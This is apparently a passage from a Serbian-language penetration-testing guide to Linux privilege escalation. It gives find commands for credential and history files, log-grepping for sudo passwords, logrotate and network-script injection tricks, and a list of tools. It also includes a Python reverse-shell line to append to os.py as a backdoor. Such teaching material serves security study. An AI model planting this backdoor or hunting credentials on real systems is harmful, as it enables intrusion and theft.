### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml fajlovi
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Skriveni fajlovi
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Skripte/Binari u PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web fajlovi**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Rezervne kopije**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Poznate datoteke koje sadrže lozinke

Pročitajte kod [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), on pretražuje **nekoliko mogućih datoteka koje bi mogle sadržati lozinke**.\
**Još jedan interesantan alat** koji možete koristiti za to je: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) koja je aplikacija otvorenog koda koja služi za pribavljanje velikog broja lozinki pohranjenih na lokalnom računaru za Windows, Linux & Mac.

### Logovi

Ako možete čitati logove, možda ćete moći pronaći **zanimljive/poverljive informacije u njima**. Što je log čudniji, to će verovatno biti zanimljiviji.\
Takođe, neki **loše** konfigurisani (backdoored?) **audit logovi** mogu vam omogućiti da **zabeležite lozinke** unutar audit logova kao što je objašnjeno u ovom postu: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Da biste **čitali logove**, grupa [**adm**](interesting-groups-linux-pe/index.html#adm-group) će biti od velike pomoći.

### Shell datoteke
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generička pretraga kredencijala/Regex

Takođe treba proveriti fajlove koji u svom imenu ili sadržaju sadrže reč "**password**", kao i proveriti IPs i emails u logovima, ili hashove pomoću regexps.\
Neću ovde navoditi kako se sve ovo radi, ali ako te zanima možeš pogledati poslednje provere koje [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) izvršava.

## Fajlovi koji se mogu upisivati

### Python library hijacking

Ako znaš **odakle** će se izvršavati python skripta i **možeš pisati unutar** tog foldera ili možeš **modifikovati python libraries**, možeš izmeniti OS biblioteku i backdoor-ovati je (ako možeš pisati tamo gde će se python skripta izvršavati, kopiraj i nalepi biblioteku os.py).

Da **backdoor the library**, jednostavno dodaj na kraj biblioteke os.py sledeću liniju (promeni IP i PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Eksploatacija Logrotate

Ranjivost u `logrotate` dozvoljava korisnicima sa **write permissions** na log fajlu ili njegovim roditeljskim direktorijumima da potencijalno dobiju escalated privileges. Razlog je što se `logrotate`, često pokrenut kao **root**, može manipulisati da izvršava proizvoljne fajlove, posebno u direktorijumima kao što je _**/etc/bash_completion.d/**_. Važno je proveriti dozvole ne samo u _/var/log_ već i u bilo kom direktorijumu gde se primenjuje rotacija logova.

> [!TIP]
> Ova ranjivost utiče na `logrotate` version `3.18.0` and older

Detaljnije informacije o ranjivosti mogu se naći na ovoj stranici: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Možete iskoristiti ovu ranjivost pomoću [**logrotten**](https://github.com/whotwagner/logrotten).

Ova ranjivost je veoma slična [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** pa kad god otkrijete da možete menjati logove, proverite ko upravlja tim logovima i proverite da li možete escalate privileges zamenom logova sa symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Reference ranjivosti:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Ako, iz bilo kog razloga, korisnik može da **write** `ifcf-<whatever>` skriptu u _/etc/sysconfig/network-scripts_ **or** može da **adjust** postojeću, onda je vaš **system is pwned**.

Network skripte, _ifcg-eth0_ na primer, koriste se za mrežne konekcije. Izgledaju tačno kao .INI fajlovi. Međutim, one su \~sourced\~ na Linuxu od strane Network Manager (dispatcher.d).

U mom slučaju, atribut `NAME=` u ovim network skriptama se ne obrađuje pravilno. Ako imate **white/blank space in the name the system tries to execute the part after the white/blank space**. To znači da **everything after the first blank space is executed as root**.

Na primer: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Napomena: prazan razmak između Network i /bin/id_)

### **init, init.d, systemd, and rc.d**

Direktorijum `/etc/init.d` sadrži **skripte** za System V init (SysVinit), **klasični Linux sistem za upravljanje servisima**. Uključuje skripte za `start`, `stop`, `restart`, i ponekad `reload` servisa. One se mogu izvršavati direktno ili preko simboličkih linkova koji se nalaze u `/etc/rc?.d/`. Alternativna putanja na Redhat sistemima je `/etc/rc.d/init.d`.

S druge strane, `/etc/init` je povezano sa **Upstart**, novijim sistemom za **service management** koji je uveo Ubuntu i koji koristi konfig fajlove za upravljanje servisima. Uprkos prelasku na Upstart, SysVinit skripte se i dalje koriste zajedno sa Upstart konfiguracijama zbog sloja kompatibilnosti u Upstart-u.

**systemd** se pojavio kao moderan init i manager servisa, nudeći napredne mogućnosti kao što su pokretanje daemona na zahtev, upravljanje automount-ovima i snimci stanja sistema. On organizuje fajlove u `/usr/lib/systemd/` za pakete distribucije i `/etc/systemd/system/` za izmene administratora, što pojednostavljuje administraciju sistema.

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks često hook-uju syscall da bi eksponirali privilegovanu kernel funkcionalnost ka userspace manageru. Slaba autentikacija managera (npr. provere potpisa zasnovane na FD-order ili loše šeme lozinki) može omogućiti lokalnoj aplikaciji da se predstavi kao manager i eskalira na root na već-rootovanim uređajima. Saznajte više i detalje eksploatacije ovde:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-driven service discovery u VMware Tools/Aria Operations može izvući putanju do binarnog fajla iz komandnih linija procesa i izvršiti je sa parametrom -v u privilegovanom kontekstu. Permisivni paterni (npr. korišćenje \S) mogu se poklopiti sa attacker-staged listener-ima u zapisivim lokacijama (npr. /tmp/httpd), što vodi do izvršavanja kao root (CWE-426 Untrusted Search Path).

Saznajte više i pogledajte generalizovani obrazac primenljiv na druge discovery/monitoring stack-ove ovde:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Najbolji alat za pronalaženje Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)


- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
